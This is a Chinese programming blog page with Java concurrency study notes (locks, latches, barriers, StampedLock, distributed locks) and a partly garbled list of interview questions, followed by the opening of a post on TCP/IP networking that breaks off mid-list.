<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReentrantLockExample</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// critical section</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>doSomething</code>方法中的代码是互斥的，也就是说，在任何时刻，最多只有一个线程可以执行这段代码。</p>
<p>ReentrantLock提供了比内置<code>synchronized</code>关键字更强大更灵活的锁机制。</p>
<p>ReentrantLock比synchronized增加的功能：</p>
<ol>
<li>ReentrantLock可以设置等待时间，如果超时未得到锁，可以进入finally里面解除获取锁的操作</li>
<li>ReentrantLock可以使用可打断的等待lock.lockInterruptibly()，其他线程打断可打断的等待线程之后，等待线程就可以进入被打断的catch</li>
<li>ReentrantLock还支持公平锁，synchronized只支持非公平锁。公平锁模式可以防止线程饥饿，但是在性能上通常不如非公平锁模式。ReentrantLock使用公平锁的方式是往够早函数里面传一个true参数，即new ReentrantLock(true)。</li>
</ol>
<p><strong>lock.lock();是写在try里面还是外面</strong></p>
<p>在使用 <code>Lock</code> 的时候，通常建议将 <code>lock.lock();</code> 写在 <code>try</code> 块的外面，然后在 <code>finally</code> 块中释放锁。例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// access shared resources</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样做的原因是，如果获取锁（<code>lock.lock()</code>）失败抛出了异常，那么在 <code>finally</code> 块中就无需（也不能）去释放这个锁。如果将 <code>lock.lock();</code> 写在 <code>try</code> 块内部，当获取锁抛出异常时，<code>finally</code> 块仍然会执行，这可能会导致尝试释放一个实际上并未被当前线程持有的锁，从而引发 <code>IllegalMonitorStateException</code>。</p>
<p>然而，需要注意的是，这种模式主要适用于 <code>lock.lock()</code> 不会抛出受检异常的情况。在 <code>java.util.concurrent.locks.Lock</code> 接口中，<code>lock()</code> 方法是不会抛出受检异常的。但如果你使用的锁实现可能会在 <code>lock()</code> 方法中抛出受检异常，那么你可能需要将 <code>lock()</code> 调用放入 <code>try</code> 块中，并在 <code>catch</code> 块中适当地处理异常。</p>
<h2 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h2><p>概念：</p>
<p><code>CountDownLatch</code>是Java并发编程中的一个重要工具，它位于<code>java.util.concurrent</code>包中。<code>CountDownLatch</code>允许一个或多个线程等待其他线程完成一组操作。</p>
<p><code>CountDownLatch</code>是不能重用的，一旦计数器的值变为0，就不能再次将它重置回一个非零的值。</p>
<p>使用场景：</p>
<p>这种机制在某些场景下非常有用。例如，假设我们有一个并发程序，主线程需要等待其他几个工作线程完成一组操作后才能继续执行。在这种情况下，我们可以使用<code>CountDownLatch</code>。</p>
<p>用法：</p>
<p>我们可以创建一个<code>CountDownLatch</code>的实例，将计数器的初始值设为工作线程的数量。每个工作线程完成任务后调用<code>countDown()</code>方法。主线程在开始任务前调用<code>await()</code>方法，然后等待所有的工作线程都完成任务。这里有一个简单的例子来说明<code>CountDownLatch</code>的使用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountDownLatchDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">workerNum</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">CountDownLatch</span> <span class="variable">latch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(workerNum);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; workerNum; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="comment">// do some work</span></span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot; finished work.&quot;</span>);</span><br><span class="line">                latch.countDown();</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        latch.await();</span><br><span class="line">        System.out.println(<span class="string">&quot;All workers have finished their jobs.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，创建一个了<code>CountDownLatch</code>的实例时，传递给它的构造函数的整数就是计数器的初始值。每个工作线程在完成任务后调用<code>countDown()</code>方法，每次调用这个方法都会将计数器的值减1。主线程在开始任务前调用<code>await()</code>方法，使主线程等待，然后等待计数器的值变为0，主线程继续执行，并输出一条消息。</p>
<h2 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h2><p><code>CyclicBarrier</code> 是 Java 并发编程中一种同步辅助工具，它允许一组线程互相等待，直到所有线程都到达某个公共的屏障点（Barrier Point）。</p>
<p>“Cyclic” 的含义是这个屏障点是可以重复利用的，也就是说，一旦所有等待线程都达到了屏障点，这个屏障就可以为下一轮的等待线程使用。</p>
<p>使用示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.CyclicBarrier;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CyclicBarrierDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个新的CyclicBarrier，当有3个线程达到时触发</span></span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">barrier</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(<span class="number">3</span>, <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">// 所有线程到达屏障后执行此任务</span></span><br><span class="line">                System.out.println(<span class="string">&quot;所有线程都到达了屏障点&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动三个将在屏障处等待的线程</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Task</span>(barrier), <span class="string">&quot;线程 1&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Task</span>(barrier), <span class="string">&quot;线程 2&quot;</span>);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Task</span>(barrier), <span class="string">&quot;线程 3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Task</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> CyclicBarrier barrier;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Task</span><span class="params">(CyclicBarrier barrier)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.barrier = barrier;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot; 在屏障处等待&quot;</span>);</span><br><span class="line">                barrier.await();</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot; 已经通过了屏障&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (BrokenBarrierException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Phaser"><a href="#Phaser" class="headerlink" title="Phaser"></a>Phaser</h2><h2 id="ReadWriteLock"><a href="#ReadWriteLock" class="headerlink" title="ReadWriteLock"></a>ReadWriteLock</h2><p>ReadWriteLock，读写锁，</p>
<p>读写锁：</p>
<ul>
<li>共享锁（读锁）：读共享</li>
<li>排他锁（写锁）：写互斥</li>
</ul>
<p>由ReadWriteLock对象可以得到读锁和写锁</p>
<h2 id="StampedLock"><a href="#StampedLock" class="headerlink" title="StampedLock"></a>StampedLock</h2><p><code>StampedLock</code> 是 Java 在 JDK 8 中引入的一个新的同步工具类，用来解决某些场景下的并发问题。它设计的初衷是为了优化读多写少的场景，因此在读线程非常多，写线程非常少的情况下，<code>StampedLock</code> 提供了一种乐观读锁，可以使得多个线程同时读，大大提高了并发性能。</p>
<p><code>StampedLock</code> 提供的锁包括写锁、悲观读锁以及乐观读，这三种锁的释放和获取都是通过一个 <code>stamp</code>（邮票）变量来控制的，这个 <code>stamp</code> 变量类似于版本号，每次写锁的获取和释放都会导致 <code>stamp</code> 变化。</p>
<p>下面是一个使用 <code>StampedLock</code> 的例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> x, y;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">StampedLock</span> <span class="variable">sl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StampedLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">double</span> deltaX, <span class="type">double</span> deltaY)</span> &#123; <span class="comment">// 移动点的位置</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">stamp</span> <span class="operator">=</span> sl.writeLock(); <span class="comment">// 获取写锁</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            x += deltaX;</span><br><span class="line">            y += deltaY;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            sl.unlockWrite(stamp); <span class="comment">// 释放写锁</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> <span class="title function_">distanceFromOrigin</span><span class="params">()</span> &#123; <span class="comment">// 计算从原点到现在位置的距离</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">stamp</span> <span class="operator">=</span> sl.tryOptimisticRead(); <span class="comment">// 尝试获取乐观读锁</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">currentX</span> <span class="operator">=</span> x, currentY = y;</span><br><span class="line">        <span class="keyword">if</span> (!sl.validate(stamp)) &#123; <span class="comment">// 如果乐观读锁验证失败，改用悲观读锁</span></span><br><span class="line">            stamp = sl.readLock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                currentX = x;</span><br><span class="line">                currentY = y;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                sl.unlockRead(stamp); <span class="comment">// 释放悲观读锁</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.sqrt(currentX * currentX + currentY * currentY);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>move</code> 方法使用写锁，保证了数据的完整性，而 <code>distanceFromOrigin</code> 方法首先尝试获取乐观读锁，如果验证成功，则直接计算结果，否则改用悲观读锁。</p>
<p>需要注意的是，<code>StampedLock</code> 不支持重入和条件变量，使用时也要注意避免锁升级导致的死锁问题。此外，<code>StampedLock</code> 的锁方法不响应中断，如果需要支持中断，可以使用相应的 <code>xxxLockInterruptibly</code> 方法。</p>
<h2 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h2><p>信号量</p>
<p>用途：限流</p>
<h2 id="Exchanger"><a href="#Exchanger" class="headerlink" title="Exchanger"></a>Exchanger</h2><h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><p>ThreadPool与Executor<br>ExecuteService<br>Excecutors<br>Callable-带返回值的Runnable<br>异步调用Future<br>fixed<br>cached<br>single<br>常用线程池<br>scheduled<br>workstealing<br>forkjoin<br>ParallelStreamAPI</p>
<h1 id="死锁、饥饿、活锁"><a href="#死锁、饥饿、活锁" class="headerlink" title="死锁、饥饿、活锁"></a>死锁、饥饿、活锁</h1><h1 id="JUC同步工具"><a href="#JUC同步工具" class="headerlink" title="JUC同步工具"></a>JUC同步工具</h1><p>cas自旋原理<br>ReentrantLock可重入锁<br>Condition条件等待与通知<br>Latch<br>cyclicBarrier线程栅栏<br>Semaphore信号量<br>Semaphore与Lock的区别(高频面试)<br>ThreadLocal线程本地变量（高频面试)<br>phaser<br>Exchanger</p>
<h1 id="JMH"><a href="#JMH" class="headerlink" title="JMH"></a>JMH</h1><p>JMH解决什么问题<br>JMH插件安装<br>JMH吞吐量测试<br>JMH QPS&#x2F;TPS测试</p>
<p><strong>对象锁</strong>：适用于同步非static方法和同步代码块。当一个线程获取了对象锁，其他线程必须等待这个锁被释放才能执行被该对象锁保护的非static同步方法或者被该对象锁保护的同步代码块。</p>
<p><strong>类锁</strong>：适用于同步static方法和同步class对象的代码块。当一个线程获取了类锁，其他线程必须等待这个锁被释放才能执行被该类锁保护的static同步方法或者被该类锁保护的同步class对象的代码块。</p>
<h1 id="原子类"><a href="#原子类" class="headerlink" title="原子类"></a>原子类</h1><p>秒杀性能比较：</p>
<p>synchronized</p>
<p>AtomicInteger</p>
<p>实现原理：基于CAS，使用了<code>Unsafe</code>类的一些函数来进行底层的原子性操作。虽然<code>Unsafe</code>类可以进行一些不安全的操作，但在<code>AtomicInteger</code>中，它被用来实现线程安全的原子性操作。这是一个很好的例子，说明了工具本身并不决定结果，关键在于如何使用工具。</p>
<p>LongAdder</p>
<p>实现原理：分段锁，每个线程对应数组中的一个值，最后将值加和</p>
<h1 id="分工问题的实现方式"><a href="#分工问题的实现方式" class="headerlink" title="分工问题的实现方式"></a>分工问题的实现方式</h1><p>Guarded Suspension模式</p>
<p>Thread-Pre-Message模式</p>
<p>生产者-消费者模式</p>
<p>两阶段终止模式</p>
<p>Worker-Thread模式</p>
<p>Balking模式</p>
<h1 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h1><p>分布式锁是一种在分布式系统环境下的锁，用于控制跨多个节点的共享资源的访问。这对于需要在多个节点之间同步或序列化操作的应用来说是非常重要的。</p>
<p>实现分布式锁的方式有多种，例如基于数据库的锁、基于Redis的锁、基于Zookeeper的锁等。</p>
<p>以下是一些常见的分布式锁实现方式：</p>
<ol>
<li><p>基于数据库的锁：这种方式通常是在数据库中创建一张锁表，需要获取锁的时候在这张表中插入一条记录，释放锁的时候则删除这条记录。这种方式实现简单，但是性能可能会受到影响。</p>
</li>
<li><p>基于Redis的锁：Redis提供了一些原子性的操作，比如<code>SETNX</code>，可以利用这些特性来实现分布式锁。<code>SETNX</code>命令可以在键不存在的情况下设置键值对，如果键已经存在，则不做任何操作。这种方式性能较好，但是需要处理好锁的超时和续期问题。</p>
</li>
<li><p>基于Zookeeper的锁：Zookeeper提供了一种叫做顺序临时节点的机制，可以利用这个机制来实现分布式锁。要获取锁的线程创建一个临时节点，如果这个节点是所有节点中序号最小的，那么就认为这个线程获取了锁。这种方式性能较差，但是更加可靠，适合对一致性要求更高的场景。</p>
</li>
</ol>
<p>使用分布式锁需要注意一些问题，比如避免死锁、处理好锁的超时问题，以及在某些情况下可能需要考虑公平性问题。</p>
<h1 id="乐观锁和悲观锁"><a href="#乐观锁和悲观锁" class="headerlink" title="乐观锁和悲观锁"></a>乐观锁和悲观锁</h1><p>乐观锁和悲观锁是数据库并发控制中的两种主要技术，它们各自对系统中的并发冲突有不同的预期和处理方式。</p>
<ol>
<li><p>悲观锁（Pessimistic Locking）：<br> 悲观锁假设数据在并发处理中很可能会引发冲突，因此在数据处理前会先加锁，以保证数据处理的独占性。例如，在读数据时加读锁，防止数据被其他事务修改；在写数据时加写锁，防止数据被其他事务读或写。悲观锁的主要优点是可以有效地避免数据的并发冲突，但缺点是锁的开销较大，且可能降低并发性能。</p>
</li>
<li><p>乐观锁（Optimistic Locking）：<br> 乐观锁相对于悲观锁来说，更“乐观”，它假设数据在大部分情况下并不会引发冲突，因此并不会在数据处理前加锁，而是在数据处理后（通常是在数据提交更新时）检查是否存在冲突。如果存在冲突（例如数据已经被其他事务修改），那么本次处理会失败，这时可以选择重试处理或者回滚操作。乐观锁的主要优点是并发性能较高，但缺点是需要处理因并发冲突导致的处理失败。</p>
</li>
</ol>
<p>乐观锁和悲观锁的选择通常取决于数据的并发冲突概率和对并发性能的要求。如果并发冲突概率较高，或者对数据一致性要求较严格，那么可以使用悲观锁；如果并发冲突概率较低，或者对并发性能要求较高，那么可以使用乐观锁。</p>
<p>monitorenter monitorexit AQS。里八尿埋: entry<br>count, state<br>2锁的四种状态及升级过程3.CMS和G1的异同<br>4.G1什么时候引发Full GC<br>5.除了CAS，原子类，syn,Lock还有什么线程安全的方式<br>final<br>6.HashMap和Hashtable的异同<br>7.允许null键的map你知道哪些<br>HashMap，LinkedHashMap, WeakHashMap<br>8.null键放在HashMap的哪里<br>底层数组的0号位置<br>9.为什么hashtable的扩容是2倍+1<br>从除留余数法，hashtable初始容量方面回答<br>10.红黑树的插入时间复杂度<br>11.解决哈希冲突的方式<br>12.现有1T的数据，内存只有1G，该怎么对他们排序<br>外部排序(多路归并)<br>13.Tomcat为什么要重写类加载器<br>14.tcp握手挥手过程及其状态转换15.mysql隔离级别<br>16.B树和B+树的区别<br>17.你知道哪些设计模式，它们在JDK源码中是怎么体现的18.Java运行时数据区<br>19.说一个最熟悉的垃圾回收算法<br>20.吞吐量优先和响应时间优先的回收器是哪些<br>parallel scavenge和CMS<br>21.类加载全过程</p>
<p>22.线程池7个参数<br>23.CAS的ABA问题怎么解决<br>AtomicStampedReference，还可月<br>24.Java内存模型<br>JMM共享内存模型以及8个原子操作指令<br>25.什么叫做阻塞队列的有界和无界<br>26.cookie和session介绍一下<br>27.说一下反射，反射会影响性能吗28.谈一下AQS吧<br>29.为什么你说AQS的底层是CAS+volatile<br>state是volatile修饰的，<br>:ompareAndSetState<br>30.JUC包里的同步组件主要实现了AQS的哪些主要方法<br>tryA<br>ryReleaseShared, isHeldExclusivelycoding: leetcode+剑指offer原题<br>美团(3轮技术面):<br>.ConcurrentHashMap底层原理?.手写一个LRU<br>用LinkedHashMap<br>3.HashMap底层数据结构<br>4.为什么用红黑树不用普通的AVL树5.为什么在8的时候链表变成树5.为什么在6的时候从树退回链表7.线程池7个参数，该怎么配置最好3.说一下volatile</p>
<p>19.具体讲一下CMS流程20.锁的四种状态<br>21.Object obj &#x3D; new Object()这句话在内存里占用了多少内存<br>引用<br>填充增值16Byte，共20Byte<br>22.synchronized和reentrantLock的异同<br>京东（2轮技术面):<br>1.总体说一下集合框架Ⅰ2.你怎么看待接口和抽象类3.索引的分类<br>4.主键索引的设计应该采用B-tree索引还是hash索引5.设计模式说5，6个<br>5.谈一谈DDD面向领域编程<br>7.说一下hibernate—级缓存和二级缓存3.说一下你了解的MQ<br>9.谈一谈你对高并发的理解，你会从什么角度设计高并发程序10.JUC包里的限流该怎么做到<br>Semaphore &#x2F; guava ratelimiter<br>11.索引不适用的条件<br>12.说一下NIO和AIO<br>13.AIO里用到什么设计模式<br>观察者<br>14.说一下select,poll, epoll<br>15.谈一下TCP的拥塞控制</p>
<p>Tomcat为什么要重写类加载器tcp握手挥手过程及其状态转换mysql隔离级别<br>B树和B+树的区别<br>你知道哪些设计模式，它们在JDK源码中是怎么体现的Java运行时数据区<br>说一个最熟悉的垃圾回收算法<br>吞吐量优先和响应时间优先的回收器是哪些<br>parallel scavenge和C<br>MS<br>类加载全过程<br>线程池7个参数<br>CAS的ABA问题怎么解决<br>AtomicStampedReference，还可用带boolean版本戳的AtomicMarkableReference<br>Java内存模型<br>JMM共享内存模型以及8个原子操作指令<br>什么叫做阻塞队列的有界和无界<br>cookie和session介绍一下<br>说一下反射，反射会影响性能吗谈一下AQS吧<br>为什么你说AQS的底层是CAS+volatile<br>state是volatile修饰的，并且设置state的方法除了有setState，还有<br>npareAndSetState<br>JUC包里的同步组件主要实现了AQS的哪些主要方法<br>tryAcquire,<br>tryRelease, tryAcquireShared,<br>ReleaseShared, isHeldExclusivelycoding: leetcode+剑指offer原题共5题</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" class="post-title-link" itemprop="url">计算机网络</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-05-07 21:37:05" itemprop="dateCreated datePublished" datetime="2023-05-07T21:37:05+08:00">2023-05-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-05-10 08:58:04" itemprop="dateModified" datetime="2023-05-10T08:58:04+08:00">2023-05-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="TCP-x2F-IP五层网络模型"><a href="#TCP-x2F-IP五层网络模型" class="headerlink" title="TCP&#x2F;IP五层网络模型"></a>TCP&#x2F;IP五层网络模型</h1><ol>
<li><strong>应用层</strong>：负责处理应用程序的特定通信细节。常见的应用层协议有HTTP（用于Web浏览器和服务器之间的通信）、SMTP（用于发送和接收电子邮件）和FTP（用于文件传输）等。</li>
<li><strong>传输层</strong>：负责在网络中传输数据。主要有两种传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。TCP提供可靠的、面向连接的数据传输，确保数据完整性和顺序；UDP提供不可靠的、无连接的数据传输，速度快但可能丢失数据。</li>
<li><strong>网络层</strong>：负责将数据包在网络中进行路由和寻址。互联网协议（IP）是网络层的核心协议，负责将数据包传输到目标设备。此外，还有一些辅助协议，如ICMP（用于诊断网络问题）和IGMP（用于多播通信）等。</li>
<li><strong>数据链路层</strong>：负责在同一网络中传输数据帧。数据链路层协议负责将网络层的IP数据包封装为数据帧，并通过物理介质进行传输。常见的数据链路层协议有以太网、Wi-Fi和PPP等。</li>
<li><strong>物理层</strong>：负责在物理介质上进行数据传输。物理层定义了网络设备之间的电气、机械和时序规范，以及数据在物理介质上的编码方式。常见的物理介质有双绞线、光纤和无线电波等。</li>
</ol>
<h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><p>TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的传输协议。</p>
<h2 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h2><p>TCP报文（也称为TCP段或TCP数据包）是TCP协议中用于在网络中传输数据的基本单位。TCP报文包含了一个TCP首部和可选的数据部分。</p>
<p>TCP报文的首部格式如下：</p>
<ol>
<li><strong>源端口（Source Port，16位）</strong>：表示报文发送方的端口号。</li>
<li><strong>目的端口（Destination Port，16位）</strong>：表示报文接收方的端口号。</li>
<li><strong>序列号（Sequence Number，32位）</strong>：表示报文中数据的第一个字节的序列号。是TCP报文中每个字节的唯一编号。当发送方发送一个TCP报文时，它会为报文中的第一个字节分配一个序列号。序列号的主要作用是帮助接收方对乱序、重复或丢失的报文进行排序和处理，从而确保数据的顺序和完整性。</li>
<li><strong>确认号（Acknowledgment Number，32位）</strong>：表示期望收到对方下一个报文的序列号，只有当ACK标志位被设置时才有效。</li>
<li><strong>数据偏移（Data Offset，4位）</strong>：表示TCP首部的长度，以32位字（4字节）为单位。</li>
<li><strong>保留（Reserved，6位）</strong>：保留位，未使用，设置为0。</li>
<li><strong>控制位（Control Bits，6位）</strong>：包含了一系列控制标志，如URG（紧急指针有效）、ACK（确认号有效）、PSH（推送）、RST（复位连接）、SYN（同步序列号）、FIN（结束连接）等。</li>
